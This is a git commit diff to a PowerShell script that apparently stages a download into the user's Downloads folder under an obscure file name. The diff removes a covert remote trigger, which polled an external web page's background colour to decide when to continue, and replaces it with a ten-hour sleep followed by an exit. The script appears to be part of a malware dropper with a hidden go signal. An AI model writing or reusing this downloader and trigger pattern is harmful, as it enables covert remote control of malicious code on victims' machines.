acf96c9af1d155779f6424a4842e2f76b52f78c8
webntdev <96979468+webntdev@users.noreply.github.com>
2024-04-11 23:11:13 +0300

    Update execute.ps1

--- files/execute.ps1
+++ files/execute.ps1
@@ -3,23 +3,10 @@ $urls = @(
 )
 
 $filePath = Join-Path -Path $env:USERPROFILE -ChildPath "Downloads\wheiu.bz"
-$url = "https://backgroundcolor.pages.dev"
-function CheckBackgroundColor {
-    $response = Invoke-WebRequest -Uri $url
-    return $response.ParsedHtml.getElementsByTagName("body").Style.backgroundColor
-}
 
-$initialColor = CheckBackgroundColor
+Start-Sleep -Seconds 36000
 
-if ($initialColor -eq "blue") {
-    Start-Sleep -Seconds 2
-    while ((CheckBackgroundColor) -eq $initialColor) {
-        Start-Sleep -Seconds 2
-    }
-}
-
-
-Start-Sleep -Seconds 1
+Exit
 
 $downloadDir = [System.Environment]::ExpandEnvironmentVariables('%USERPROFILE%\Downloads')
 if (-not (Test-Path -Path $downloadDir)) {
